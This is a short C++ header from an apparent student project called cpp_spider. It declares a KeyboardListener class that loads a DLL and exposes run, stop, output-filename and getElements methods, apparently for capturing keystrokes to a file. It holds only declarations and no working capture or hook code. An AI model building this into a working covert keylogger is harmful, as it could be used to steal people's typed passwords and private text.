//
// KeyboardListener.hh for KeyboardListener in c:\Users\49207\Documents\Epitech-Rendu\cpp_spider\include\dll
//
// Made by Axel Drozdzynski
// Login   <drozdz_b>
//
// Started on  Sat Oct 6 19:26:46 2017 Axel Drozdzynski
// Last update Sat Oct 6 19:26:55 2017 Axel Drozdzynski
//

#ifndef KEYBOARDLISTENER_HH_
#define KEYBOARDLISTENER_HH_

#include <windows.h>
#include <string>
#include <list>

#include "IListener.hh"

typedef int(__cdecl *f_dllfunc)(void);

class KeyboardListener : public IListener
{
private:
	HINSTANCE _dll;
	std::string _FilenameOutput;
public:
	KeyboardListener();

	virtual int run();
	virtual int stop();
	virtual std::string getFilenameOutput();
	virtual int getElements(std::list<std::string>& list);
};

#endif